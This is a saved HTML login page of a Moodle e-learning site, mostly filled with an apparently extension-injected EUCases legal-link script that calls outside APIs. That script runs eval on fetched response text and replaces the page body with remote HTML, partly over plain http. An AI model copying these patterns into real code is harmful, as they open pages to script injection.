<html dir="ltr" lang="en" xml:lang="en" class="yui3-js-enabled"><script src="chrome-extension://ljdobmomdgdljniojadhoplhkpialdid/page/prompt.js"></script><script src="chrome-extension://ljdobmomdgdljniojadhoplhkpialdid/page/runScript.js"></script><head>
    <title>E-learning Universitas Paramadina: Log in to the site</title>
    <link rel="shortcut icon" href="//elearning.paramadina.ac.id/pluginfile.php/1/theme_fordson/favicon/1614831401/favicon.ico">
    <meta name="apple-itunes-app" content="app-id=633359593, app-argument=https://elearning.paramadina.ac.id/login/index.php"><link rel="manifest" href="https://elearning.paramadina.ac.id/admin/tool/mobile/mobile.webmanifest.php"><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name="keywords" content="moodle, E-learning Universitas Paramadina: Log in to the site">
<link rel="stylesheet" type="text/css" href="https://elearning.paramadina.ac.id/theme/yui_combo.php?rollup/3.17.2/yui-moodlesimple-min.css"><script charset="utf-8" id="yui_3_17_2_1_1617163018483_8" src="https://elearning.paramadina.ac.id/theme/yui_combo.php?m/1612752544/core/event/event-min.js&amp;m/1612752544/filter_mathjaxloader/loader/loader-min.js" async=""></script><script charset="utf-8" id="yui_3_17_2_1_1617163018483_19" src="https://elearning.paramadina.ac.id/theme/yui_combo.php?3.17.2/event-mousewheel/event-mousewheel-min.js&amp;3.17.2/event-resize/event-resize-min.js&amp;3.17.2/event-hover/event-hover-min.js&amp;3.17.2/event-touch/event-touch-min.js&amp;3.17.2/event-move/event-move-min.js&amp;3.17.2/event-flick/event-flick-min.js&amp;3.17.2/event-valuechange/event-valuechange-min.js&amp;3.17.2/event-tap/event-tap-min.js" async=""></script><script id="firstthemesheet" type="text/css">/** Required in order to fix style inclusion problems in IE with YUI **/</script><link rel="stylesheet" type="text/css" href="https://elearning.paramadina.ac.id/theme/styles.php/fordson/1614831401_1/all">
<script>
//<![CDATA[
var M = {}; M.yui = {};
M.pageloadstarttime = new Date();
M.cfg = {"wwwroot":"https:\/\/elearning.paramadina.ac.id","sesskey":"h64v6SMJtY","sessiontimeout":"28800","themerev":"1614831401","slasharguments":1,"theme":"fordson","iconsystemmodule":"core\/icon_system_fontawesome","jsrev":"1612752544","admin":"admin","svgicons":true,"usertimezone":"Asia\/Jakarta","contextid":1,"langrev":1617052985,"templaterev":"1612752545"};var yui1ConfigFn = function(me) {if(/-skin|reset|fonts|grids|base/.test(me.name)){me.type='css';me.path=me.path.replace(/\.js/,'.css');me.path=me.path.replace(/\/yui2-skin/,'/assets/skins/sam/yui2-skin')}};
var yui2ConfigFn = function(me) {var parts=me.name.replace(/^moodle-/,'').split('-'),component=parts.shift(),module=parts[0],min='-min';if(/-(skin|core)$/.test(me.name)){parts.pop();me.type='css';min=''}
if(module){var filename=parts.join('-');me.path=component+'/'+module+'/'+filename+min+'.'+me.type}else{me.path=component+'/'+component+'.'+me.type}};
YUI_config = {"debug":false,"base":"https:\/\/elearning.paramadina.ac.id\/lib\/yuilib\/3.17.2\/","comboBase":"https:\/\/elearning.paramadina.ac.id\/theme\/yui_combo.php?","combine":true,"filter":null,"insertBefore":"firstthemesheet","groups":{"yui2":{"base":"https:\/\/elearning.paramadina.ac.id\/lib\/yuilib\/2in3\/2.9.0\/build\/","comboBase":"https:\/\/elearning.paramadina.ac.id\/theme\/yui_combo.php?","combine":true,"ext":false,"root":"2in3\/2.9.0\/build\/","patterns":{"yui2-":{"group":"yui2","configFn":yui1ConfigFn}}},"moodle":{"name":"moodle","base":"https:\/\/elearning.paramadina.ac.id\/theme\/yui_combo.php?m\/1612752544\/","combine":true,"comboBase":"https:\/\/elearning.paramadina.ac.id\/theme\/yui_combo.php?","ext":false,"root":"m\/1612752544\/","patterns":{"moodle-":{"group":"moodle","configFn":yui2ConfigFn}},"filter":null,"modules":{"moodle-core-dragdrop":{"requires":["base","node","io","dom","dd","event-key","event-focus","moodle-core-notification"]},"moodle-core-formchangechecker":{"requires":["base","event-focus","moodle-core-event"]},"moodle-core-chooserdialogue":{"requires":["base","panel","moodle-core-notification"]},"moodle-core-notification":{"requires":["moodle-core-notification-dialogue","moodle-core-notification-alert","moodle-core-notification-confirm","moodle-core-notification-exception","moodle-core-notification-ajaxexception"]},"moodle-core-notification-dialogue":{"requires":["base","node","panel","escape","event-key","dd-plugin","moodle-core-widget-focusafterclose","moodle-core-lockscroll"]},"moodle-core-notification-alert":{"requires":["moodle-core-notification-dialogue"]},"moodle-core-notification-confirm":{"requires":["moodle-core-notification-dialogue"]},"moodle-core-notification-exception":{"requires":["moodle-core-notification-dialogue"]},"moodle-core-notification-ajaxexception":{"requires":["moodle-core-notification-dialogue"]},"moodle-core-languninstallconfirm":{"requires":["base","node","moodle-core-notification-confirm","moodle-core-notification-alert"]},"moodle-core-popuphelp":{"requires":["moodle-core-tooltip"]},"moodle-core-blocks":{"requires":["base","node","io","dom","dd","dd-scroll","moodle-core-dragdrop","moodle-core-notification"]},"moodle-core-event":{"requires":["event-custom"]},"moodle-core-handlebars":{"condition":{"trigger":"handlebars","when":"after"}},"moodle-core-actionmenu":{"requires":["base","event","node-event-simulate"]},"moodle-core-maintenancemodetimer":{"requires":["base","node"]},"moodle-core-tooltip":{"requires":["base","node","io-base","moodle-core-notification-dialogue","json-parse","widget-position","widget-position-align","event-outside","cache-base"]},"moodle-core-lockscroll":{"requires":["plugin","base-build"]},"moodle-core_availability-form":{"requires":["base","node","event","event-delegate","panel","moodle-core-notification-dialogue","json"]},"moodle-backup-confirmcancel":{"requires":["node","node-event-simulate","moodle-core-notification-confirm"]},"moodle-backup-backupselectall":{"requires":["node","event","node-event-simulate","anim"]},"moodle-course-formatchooser":{"requires":["base","node","node-event-simulate"]},"moodle-course-management":{"requires":["base","node","io-base","moodle-core-notification-exception","json-parse","dd-constrain","dd-proxy","dd-drop","dd-delegate","node-event-delegate"]},"moodle-course-dragdrop":{"requires":["base","node","io","dom","dd","dd-scroll","moodle-core-dragdrop","moodle-core-notification","moodle-course-coursebase","moodle-course-util"]},"moodle-course-categoryexpander":{"requires":["node","event-key"]},"moodle-course-util":{"requires":["node"],"use":["moodle-course-util-base"],"submodules":{"moodle-course-util-base":{},"moodle-course-util-section":{"requires":["node","moodle-course-util-base"]},"moodle-course-util-cm":{"requires":["node","moodle-course-util-base"]}}},"moodle-form-shortforms":{"requires":["node","base","selector-css3","moodle-core-event"]},"moodle-form-dateselector":{"requires":["base","node","overlay","calendar"]},"moodle-form-passwordunmask":{"requires":[]},"moodle-question-chooser":{"requires":["moodle-core-chooserdialogue"]},"moodle-question-searchform":{"requires":["base","node"]},"moodle-question-preview":{"requires":["base","dom","event-delegate","event-key","core_question_engine"]},"moodle-availability_completion-form":{"requires":["base","node","event","moodle-core_availability-form"]},"moodle-availability_date-form":{"requires":["base","node","event","io","moodle-core_availability-form"]},"moodle-availability_grade-form":{"requires":["base","node","event","moodle-core_availability-form"]},"moodle-availability_group-form":{"requires":["base","node","event","moodle-core_availability-form"]},"moodle-availability_grouping-form":{"requires":["base","node","event","moodle-core_availability-form"]},"moodle-availability_profile-form":{"requires":["base","node","event","moodle-core_availability-form"]},"moodle-mod_assign-history":{"requires":["node","transition"]},"moodle-mod_attendance-groupfilter":{"requires":["base","node"]},"moodle-mod_bigbluebuttonbn-recordings":{"requires":["base","node","datasource-get","datasource-jsonschema","datasource-polling","moodle-core-notification"]},"moodle-mod_bigbluebuttonbn-modform":{"requires":["base","node"]},"moodle-mod_bigbluebuttonbn-broker":{"requires":["base","node","datasource-get","datasource-jsonschema","datasource-polling","moodle-core-notification"]},"moodle-mod_bigbluebuttonbn-imports":{"requires":["base","node"]},"moodle-mod_bigbluebuttonbn-rooms":{"requires":["base","node","datasource-get","datasource-jsonschema","datasource-polling","moodle-core-notification"]},"moodle-mod_quiz-toolboxes":{"requires":["base","node","event","event-key","io","moodle-mod_quiz-quizbase","moodle-mod_quiz-util-slot","moodle-core-notification-ajaxexception"]},"moodle-mod_quiz-dragdrop":{"requires":["base","node","io","dom","dd","dd-scroll","moodle-core-dragdrop","moodle-core-notification","moodle-mod_quiz-quizbase","moodle-mod_quiz-util-base","moodle-mod_quiz-util-page","moodle-mod_quiz-util-slot","moodle-course-util"]},"moodle-mod_quiz-quizbase":{"requires":["base","node"]},"moodle-mod_quiz-util":{"requires":["node","moodle-core-actionmenu"],"use":["moodle-mod_quiz-util-base"],"submodules":{"moodle-mod_quiz-util-base":{},"moodle-mod_quiz-util-slot":{"requires":["node","moodle-mod_quiz-util-base"]},"moodle-mod_quiz-util-page":{"requires":["node","moodle-mod_quiz-util-base"]}}},"moodle-mod_quiz-autosave":{"requires":["base","node","event","event-valuechange","node-event-delegate","io-form"]},"moodle-mod_quiz-modform":{"requires":["base","node","event"]},"moodle-mod_quiz-questionchooser":{"requires":["moodle-core-chooserdialogue","moodle-mod_quiz-util","querystring-parse"]},"moodle-message_airnotifier-toolboxes":{"requires":["base","node","io"]},"moodle-filter_glossary-autolinker":{"requires":["base","node","io-base","json-parse","event-delegate","overlay","moodle-core-event","moodle-core-notification-alert","moodle-core-notification-exception","moodle-core-notification-ajaxexception"]},"moodle-filter_mathjaxloader-loader":{"requires":["moodle-core-event"]},"moodle-editor_atto-rangy":{"requires":[]},"moodle-editor_atto-editor":{"requires":["node","transition","io","overlay","escape","event","event-simulate","event-custom","node-event-html5","node-event-simulate","yui-throttle","moodle-core-notification-dialogue","moodle-core-notification-confirm","moodle-editor_atto-rangy","handlebars","timers","querystring-stringify"]},"moodle-editor_atto-plugin":{"requires":["node","base","escape","event","event-outside","handlebars","event-custom","timers","moodle-editor_atto-menu"]},"moodle-editor_atto-menu":{"requires":["moodle-core-notification-dialogue","node","event","event-custom"]},"moodle-report_eventlist-eventfilter":{"requires":["base","event","node","node-event-delegate","datatable","autocomplete","autocomplete-filters"]},"moodle-report_loglive-fetchlogs":{"requires":["base","event","node","io","node-event-delegate"]},"moodle-gradereport_grader-gradereporttable":{"requires":["base","node","event","handlebars","overlay","event-hover"]},"moodle-gradereport_history-userselector":{"requires":["escape","event-delegate","event-key","handlebars","io-base","json-parse","moodle-core-notification-dialogue"]},"moodle-tool_capability-search":{"requires":["base","node"]},"moodle-tool_lp-dragdrop-reorder":{"requires":["moodle-core-dragdrop"]},"moodle-tool_monitor-dropdown":{"requires":["base","event","node"]},"moodle-assignfeedback_editpdf-editor":{"requires":["base","event","node","io","graphics","json","event-move","event-resize","transition","querystring-stringify-simple","moodle-core-notification-dialog","moodle-core-notification-alert","moodle-core-notification-warning","moodle-core-notification-exception","moodle-core-notification-ajaxexception"]},"moodle-atto_accessibilitychecker-button":{"requires":["color-base","moodle-editor_atto-plugin"]},"moodle-atto_accessibilityhelper-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_align-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_bold-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_charmap-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_clear-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_collapse-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_emojipicker-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_emoticon-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_equation-button":{"requires":["moodle-editor_atto-plugin","moodle-core-event","io","event-valuechange","tabview","array-extras"]},"moodle-atto_h5p-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_html-codemirror":{"requires":["moodle-atto_html-codemirror-skin"]},"moodle-atto_html-beautify":{},"moodle-atto_html-button":{"requires":["promise","moodle-editor_atto-plugin","moodle-atto_html-beautify","moodle-atto_html-codemirror","event-valuechange"]},"moodle-atto_image-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_indent-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_italic-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_link-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_managefiles-usedfiles":{"requires":["node","escape"]},"moodle-atto_managefiles-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_media-button":{"requires":["moodle-editor_atto-plugin","moodle-form-shortforms"]},"moodle-atto_noautolink-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_orderedlist-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_recordrtc-button":{"requires":["moodle-editor_atto-plugin","moodle-atto_recordrtc-recording"]},"moodle-atto_recordrtc-recording":{"requires":["moodle-atto_recordrtc-button"]},"moodle-atto_rtl-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_strike-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_subscript-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_superscript-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_table-button":{"requires":["moodle-editor_atto-plugin","moodle-editor_atto-menu","event","event-valuechange"]},"moodle-atto_title-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_underline-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_undo-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_unorderedlist-button":{"requires":["moodle-editor_atto-plugin"]}}},"gallery":{"name":"gallery","base":"https:\/\/elearning.paramadina.ac.id\/lib\/yuilib\/gallery\/","combine":true,"comboBase":"https:\/\/elearning.paramadina.ac.id\/theme\/yui_combo.php?","ext":false,"root":"gallery\/1612752544\/","patterns":{"gallery-":{"group":"gallery"}}}},"modules":{"core_filepicker":{"name":"core_filepicker","fullpath":"https:\/\/elearning.paramadina.ac.id\/lib\/javascript.php\/1612752544\/repository\/filepicker.js","requires":["base","node","node-event-simulate","json","async-queue","io-base","io-upload-iframe","io-form","yui2-treeview","panel","cookie","datatable","datatable-sort","resize-plugin","dd-plugin","escape","moodle-core_filepicker","moodle-core-notification-dialogue"]},"core_comment":{"name":"core_comment","fullpath":"https:\/\/elearning.paramadina.ac.id\/lib\/javascript.php\/1612752544\/comment\/comment.js","requires":["base","io-base","node","json","yui2-animation","overlay","escape"]},"mathjax":{"name":"mathjax","fullpath":"https:\/\/cdn.jsdelivr.net\/npm\/mathjax@2.7.8\/MathJax.js?delayStartupUntil=configured"}}};
M.yui.loader = {modules: {}};

//]]>
</script>

<meta name="robots" content="noindex">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
<script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="core/first" src="https://elearning.paramadina.ac.id/lib/requirejs.php/1612752544/core/first.js"></script><script type="text/x-mathjax-config">
MathJax.Hub.Config({
    config: ["Accessible.js", "Safe.js"],
    errorSettings: { message: ["!"] },
    skipStartupTypeset: true,
    messageStyle: "none"
});
</script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="jquery" src="https://elearning.paramadina.ac.id/lib/javascript.php/1612752544/lib/jquery/jquery-3.4.1.min.js"></script><script id="CommonProcsId" type="text/javascript">var EUCASES_LANGS_NUMS = [];
EUCASES_LANGS_NUMS[1] = 'bg';
EUCASES_LANGS_NUMS[2] = 'de';
EUCASES_LANGS_NUMS[3] = 'fr';
EUCASES_LANGS_NUMS[4] = 'en';
EUCASES_LANGS_NUMS[5] = 'it';
EUCASES_LANGS_NUMS['bg'] = 1;
EUCASES_LANGS_NUMS['de'] = 2;
EUCASES_LANGS_NUMS['fr'] = 3;
EUCASES_LANGS_NUMS['en'] = 4;
EUCASES_LANGS_NUMS['it'] = 5;


cInsertByHandAnchorClass = 'insert-by-hand-anchor';

// polyfills
// startsWith not supported in IE
if (!String.prototype.startsWith) {
    String.prototype.startsWith = function (searchString, position) {
        position = position || 0;
        return this.indexOf(searchString, position) === position;
    };
}

// it is set in the Callbacks iff, represents the language id recognized by the annotation service
// the language is used in the visualization of the national legislation item in the Concept context menu
var TechnoResponseRecognizedLangId = 0;

var requester = (function () {

    var isCurrentHttps = function () {
        return window.location.href.startsWith('https');
    }

    var POST = function (url, callback) {
        if (document.documentMode && document.documentMode <= '9') {

            if (!isCurrentHttps()) {
                // due to limitation of the xdomainrequest
                url = url.replace('https', 'http');
            }

            var request = new XDomainRequest();
            request.isXDomain = true;
            request.timeout = 100000;
            request.onprogress = function () { }
            request.ontimeout = function () { console.log('timeout'); }
            request.onerror = function () { console.log('error'); }
            request.open('POST', url);
            request.onload = function () {
                callback(request);
            }
            return request;
        } else {
            var request = new XMLHttpRequest();
            request.open('POST', url, true);
            request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            // request.setRequestHeader("Access-Control-Allow-Origin", "*");
            // request.setRequestHeader("Access-Control-Expose-Headers", "apis-recognized-lang");
            // equest.setRequestHeader("Access-Control-Allow-Headers", "apis-recognized-lang");
            request.setRequestHeader("UI-Language", translations.getLanguage());
            request.onreadystatechange = function () {
                callback(request);
            }

            return request;
        }
    }

    var GET = function (url, callback) {
        var request = new XMLHttpRequest();
        try {
            request.open('GET', url, true);
            request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            request.onreadystatechange = function () {
                callback(request);
            }
        }
        catch (ex) { }

        return request;
    }

    var isSuccessfull = function (request) {
        return (request.readyState == 4 && request.status == 200) || request.isXDomain;
    }

    return {
        POST: POST,
        GET: GET,
        isSuccessfull: isSuccessfull
    }
})();

var eucasesHttpRequester = (function () {
    var API_URL_V2 = 'http://app.eurocases.eu/api/Doc';
    // var API_URL_V2 = 'http://web.eucases.eu:8080/api/doc';
    var API_URL = 'https://linkdetector.eurocases.eu/api/AddinsLink';
    // var API_URL = 'http://web.eucases.eu:8080/api/doc';

    // creates basic request object with basic 'get' settings
    var GET = function (url, callback) {
        var req = requester.GET(url, callback);
        return req;
    }

    // returns request object for par hint use. hint: the request is not sended by default
    var parHintFunction = function (langId, uiLangId, celex, toPar, domain, callback) {

        var parHintUrl = API_URL.concat('/parhint?langId=', langId, '&siteLangId=', uiLangId, '&docNumber=', celex);

        if (toPar && toPar != '') {
            parHintUrl = parHintUrl.concat('&toPar=', toPar);
        }
        if (domain && domain != '') {
            parHintUrl = parHintUrl.concat('&domain=', domain);
        }

        var request = GET(parHintUrl, callback);

        return request;
    }

    var registerHintFunction = function (url, callback) {
        var request = GET(url, callback);

        return request;
    }

    // returns request object rdy for use. hint: the request is not started sended by default.
    var citeFunction = function (langId, celex, citeType, domain, callback) {
        var citeUrl = API_URL.concat('/cite?langId=', langId, '&docNumber=', celex, '&citeType=', citeType);

        if (domain && domain != '') {
            citeUrl = citeUrl.concat('&domain=', domain);
        }

        var request = GET(citeUrl, callback);

        return request;
    }

    // void function used to call the callback with the url of the doc links api.
    var docLinksFunction = function (domain, doclang, uiLang, limit, celex, toPar, callback) {
        var docLinksUrl = API_URL_V2.concat('/docinlinks/', domain, '/', doclang, '/', uiLang, '/', limit, '/', celex, '/', toPar);

        callback(docLinksUrl);
    }

    // void function sued to call the callback with the url of the search by xml api
    var searchByXmlIdFunction = function (xmlId, domain, langId, uiLang, callback) {
        var searchUrl = API_URL_V2.concat('/searchbyxmlid?xmlId=', xmlId, '&domain=', domain, '&langId=', langId, '&sitelangId=', uiLang);

        callback(searchUrl);
    }

    return {
        parHint: parHintFunction,
        cite: citeFunction,
        docLinks: docLinksFunction,
        searchbyXmlId: searchByXmlIdFunction,
        registerHint: registerHintFunction
    }
})();

var technoHttpRequester = (function () {

    var API_URL = 'https://linkdetector.eurocases.eu/api/AddinsLink';
    // var API_URL = 'http://techno.eucases.eu:8338/api/AddinsLink';

    var POST = function (url, callback) {

        var request = requester.POST(url, callback);

        return request;
    }

    // creates basic request object with basic 'get' settings
    var GET = function (url, callback) {
        var req = requester.GET(url, callback);
        return req;
    }

    var setLinksFunction = function (callback) {

        var setLinksUrl = API_URL.concat('/PutWebAddinLinks');
        var request = POST(setLinksUrl, callback);

        return request;
    };

    var setTermsFunction = function (callback) {
        var setLinksUrl = API_URL.concat('/PutWebAddinTerms');
        var request = POST(setLinksUrl, callback);

        return request;
    };

    var setRegisterInfoFunction = function (callback) {
        var setPersonNamesUrl = API_URL.concat('/putwebaddinregisterinfo')
        var request = POST(setPersonNamesUrl, callback);

        return request;
    }

    var getDownloadXmlUrl = function () {
        var downloadXmlUrl = API_URL.concat('/GenerateXmlFromDoubleEncoded');
        return downloadXmlUrl;
    }

    var getConfigJsonFunction = function (callback) {
        var getConfigJsonUrl = API_URL.concat('/GetResourceFile?fileName=config.json');

        var request = GET(getConfigJsonUrl, callback);

        return request;
    }

    var openHelpFunction = function (type, lang, callback) {
        var helpUrl = API_URL.concat('/gethelp?type=', type, '&language=', lang);
        callback(helpUrl);
    }

    var getHelpUrlFunction = function (type, lang) {
        var helpUrl = API_URL.concat('/gethelp?type=', type, '&language=', lang);

        return helpUrl;
    }

    var openGuide = function (type, callback) {
        var url = API_URL.concat('/GetWebSiteGuide?type=', type);

        callback(url);
    }

    return {
        setLinks: setLinksFunction,
        getDownloadXmlUrl: getDownloadXmlUrl,
        setTerms: setTermsFunction,
        setRegisterInfo: setRegisterInfoFunction,
        getConfigJson: getConfigJsonFunction,
        openHelpFunction: openHelpFunction,
        openGuide: openGuide,
        getHelpUrlFunction: getHelpUrlFunction
    }

}());

// provides basic functionality over html elements
var htmlElementhelper = (function () {

    // determs if the current obj is instanciated. this means that is not undefined and not null
    var isObject = function (obj) {
        return obj !== undefined && obj !== null;
    }

    // determs if the current element contains class 'apisweb-link'
    var isApisAnchor = function (htmlElement) {
        var result = false;

        if (isObject(htmlElement)) {
            var callerClass = htmlElement.getAttribute('class');
            if (isObject(callerClass)) {
                result = callerClass.indexOf('apisweb-link') != -1;
            }
        }
        return result;
    }

    var isTerm = function (htmlElement) {
        var result = false;

        if (isObject(htmlElement) && htmlElement.nodeName !== "#text") {
            var callerClass = htmlElement.getAttribute('class');
            if (isObject(callerClass)) {
                result = callerClass.indexOf('eucases-term') != -1;
            }
        }
        return result;
    }

    var isEuAnchor = function (htmlElement) {
        var result = false;

        if (isObject(htmlElement) && htmlElement.nodeName !== "#text") {
            var callerClass = htmlElement.getAttribute('class');
            if (isObject(callerClass)) {
                result = callerClass.indexOf('eucases-link') != -1;
            }
        }

        return result;
    }

    var isBlock = function (node) {
        if (typeof node === "string" || node.nodeName === "#text")
            return false;

        if (node.nodeName.toLowerCase() == 'font')
            return true;

        var cStyle = node.currentStyle || window.getComputedStyle(node, "");
        return cStyle.display === 'block';
    }

    var getAncessors = function (node) {
        var result = [];

        var currentAncessor = node.parentNode;
        while (currentAncessor) {

            result.push(currentAncessor);
            currentAncessor = currentAncessor.parentNode;
        }

        return result;
    }

    var getDescendantsText = function (node, isDeep) {
        var result = [];

        if (node.nodeName === "#text" && isDeep) {
            result.push(node);
        }

        for (var i = 0; i < node.childNodes.length; i++) {
            result = result.concat(getDescendantsText(node.childNodes[i], true));
        }

        return result;
    }

    var getAllDescendant = function (node, isDeep) {
        var result = [];

        if (node && isDeep) {
            result.push(node);
        }

        for (var i = 0; i < node.childNodes.length; i++) {
            result = result.concat(getAllDescendant(node.childNodes[i], true));
        }

        return result;
    }

    var removeNodeKeepChildren = function (node) {
        if (!node.parentElement) return;
        while (node.firstChild) {
            node.parentElement.insertBefore(node.firstChild, node);
        }
        node.parentElement.removeChild(node);
    }

    var remove = function (node) {
        if (node && node.parentNode) {
            node.parentNode.removeChild(node);
        }
    }

    var removeAllChildren = function (node) {
        var children = node.childNodes;
        while (children.length != 0) {
            remove(children[0]);
        }
    }

    var replace = function (nodeToReplace, nodeToReplaceWith) {

        nodeToReplace.parentNode.replaceChild(nodeToReplaceWith, nodeToReplace);
    }

    var appendChildren = function (node, children) {
        for (var i = 0; i < children.length; i++) {
            node.appendChild(children[0]);
        }
    }

    var insertAfter = function (newNode, referenceNode) {
        if (newNode && referenceNode) {
            if (referenceNode.parentNode && referenceNode.nextSibling) {
                referenceNode.parentNode.insertBefore(newNode, referenceNode.nextSibling);
            }
        }
    }

    return {
        isObject: isObject,
        isApisAnchor: isApisAnchor,
        isBlock: isBlock,
        getAncessors: getAncessors,
        getDescendantsText: getDescendantsText,
        getAllDescendant: getAllDescendant,
        removeNodeKeepChildren: removeNodeKeepChildren,
        isTerm: isTerm,
        isEuAnchor: isEuAnchor,
        remove: remove,
        removeAllChildren: removeAllChildren,
        appendChildren: appendChildren,
        insertAfter: insertAfter,
        replace: replace
    }
})();

// provides create functions for diff html elements
var htmlElementFactory = (function () {

    var createAnchor = function (url) {
        var result = document.createElement("a");
        result.setAttribute('target', '_blank');

        if (htmlElementhelper.isObject(url)) {
            result.setAttribute('href', url);

            return result;
        }
    }

    var createHintDiv = function (id) {
        var result = document.createElement('div');
        if (id) {
            result.id = '#' + id;
        }
        result.className = 'apis-hint';

        return result;
    }

    return {
        createAnchor: createAnchor,
        createHintDiv: createHintDiv
    }

})();

// provides functions for resolving domain identifier
var domainHelper = (function () {

    var resolveForParHint = function (isApisAnchor) {
        if (isApisAnchor) return 'bgtooltip';
        else return '';
    }

    var resolveForCite = function (isApisAnchor) {
        if (isApisAnchor) return 'bgcite';
        else return '';
    }

    return {
        resolveForParHint: resolveForParHint,
        resolveForCite: resolveForCite
    }

})();


var callbacks = (function () {

    var getParHintCallBack = function (hintElemenet, href, ev) {
        // represents closure with captured hint element
        var callback = function (req) {
            document.body.appendChild(hintElemenet);

            if (requester.isSuccessfull(req)) {
                hintElemenet.innerHTML = req.responseText;

                hint.attachLogoImage(hintElemenet.firstChild);
            }
            else {
                hintElemenet.innerHTML = htmlElementFactory.createAnchor(href);
            }

            hint.position(hintElemenet, ev);
        }

        return callback;
    }

    var openUrlCallBack = function (url) {
        window.open(url);
    }

    var openUrlFromRequestCallBack = function (request) {
        if (requester.isSuccessfull(request)) {
            openUrlCallBack(request.responseText);
        }
    }

    var getOpenUrlFromRequestCallback = function () {
        var w = window.open('about:blank');
        return function (request) {
            if (requester.isSuccessfull(request)) {
                var url = request.responseText;
                w.location = url;
            }
        }
    }

    var setDocContentCallBack = function (request) {
        if (requester.isSuccessfull(request)) {

            // due to issue related with IE, after replacement of the body.innerHtml on random cases
            // the selection of the new content is disabled
            // the only successful aproach to avoid this behaviour was to use document.write(..)

            // http://stackoverflow.com/questions/9847580/how-to-detect-safari-chrome-ie-firefox-and-opera-browser
            if (document.body.replaceNode && document.documentMode /* if IE */) {

                // there is issue with IE when we replace the .innerHTML of the body with new content, the selection in random cases is disabled
                // the only solution i've could find of to replace the body node

                var newBody = document.createElement('body');
                newBody.innerHTML = request.responseText;

                // keep the annotation for the IE addin that is used to check if the current script is injected
                // if this attribute is ommited the script will be injected again, which can lead to looosing some state information, 
                //  like the current document auto-recoginzed language from the service (for more info: TechnoResponseRecognizedLangId)
                newBody.setAttribute('is-script-injected', 'true');
                newBody.setAttribute('hasValidSelectionForInsert', 'false');
                newBody.setAttribute('hasLinksInSelection', 'false');

                document.body.replaceNode(newBody);

                // reatach events to body
                contextMenu.initEvents();
                about.initEvents();

            } else {
                document.body.innerHTML = request.responseText;
            }

            dialogs.showMessage(translations.current().cSuccess);

            TechnoResponseRecognizedLangId = parseInt(request.getResponseHeader("apis-recognized-lang"));

            addinEventDispatcher.dispatchAnnotationFinnishedEvent(request.responseText);
        }
    }

    var getCiteCallBack = function (type, langId) {
        var callback = function (request) {
            if (requester.isSuccessfull(request)) {
                eval('var o=' + request.responseText);
                _ShCite(o.Text, type, langId)
            }
        }

        return callback;
    }

    var getRegisterHintCallback = function (hintElement, href, ev) {
        var callback = function (req) {
            if (req.readyState == 1) {
                return;
            }

            document.body.appendChild(hintElement);

            if (requester.isSuccessfull(req)) {
                hintElement.innerHTML = req.responseText;

                hint.attachLogoImage(hintElement.firstChild);
            }
            else hintElement.innerHTML = translations.current().cNoInfo;

            hint.position(hintElement, ev);
        }

        return callback;
    }

    return {
        getParHintCallBack: getParHintCallBack,
        openUrlCallBack: openUrlCallBack,
        setDocContentCallBack: setDocContentCallBack,
        getCiteCallBack: getCiteCallBack,
        getRegisterHintCallback: getRegisterHintCallback,
        openUrlFromRequestCallBack: openUrlFromRequestCallBack,
        getOpenUrlFromRequestCallback: getOpenUrlFromRequestCallback
    }

})();

var hint = (function () {

    var position = function (hintElement, ev) {
        // defines a value agains which is check if there is atleast 300 px from the most left corner to he right side of the browser
        // if no such space the hint left offset will be decreased
        var minRight = 600; // this is the width of the hint element defined in the css file
        var minBottom = 270; // this is the hight of the hint element defined in the css file

        var rightFreeDistance = window.innerWidth - ev.clientX;
        var isRightOutside = rightFreeDistance < minRight;

        if (isRightOutside) {
            hintElement.style.left = ev.clientX - minRight + 'px';
        }
        else {
            hintElement.style.left = ev.clientX + 10 + window.pageXOffset + 'px';
        }

        var bottomFreeDistance = window.innerHeight - ev.clientY;
        var isOutsidedBottom = bottomFreeDistance <= minBottom;

        if (isOutsidedBottom) {
            hintElement.style.top = (ev.clientY - hintElement.offsetHeight) + window.pageYOffset + 'px';
        }
        else {
            hintElement.style.top = ev.clientY + 10 + window.pageYOffset + 'px';
        }
    }

    var removeAllHints = function () {
        var hints = document.getElementsByClassName('apis-hint');
        for (var i = 0; i < hints.length; i++) {
            hints[i].parentNode.removeChild(hints[i]);
        }
    }

    var autoCloseAfter = function (hintElemenet, caller, timeInMs) {
        var intervalForHint = null;
        var closeHintInterval = function () {

            hintElemenet.setAttribute('data-apis-hint-closed', 'true');

            intervalForHint = setInterval(function () {
                clearInterval(intervalForHint);
                if (htmlElementhelper.isObject(hintElemenet.parentNode))
                    hintElemenet.parentNode.removeChild(hintElemenet);
            }, timeInMs);
        };

        hintElemenet.onmouseover = function () {
            clearInterval(intervalForHint);
        };

        hintElemenet.onmouseout = closeHintInterval;
        caller.onmouseout = closeHintInterval;
    }

    var canShowHint = function () {
        // if there are any open context menus, the hint should not be visible

        var contextMenus = document.getElementsByClassName('contextmenu');

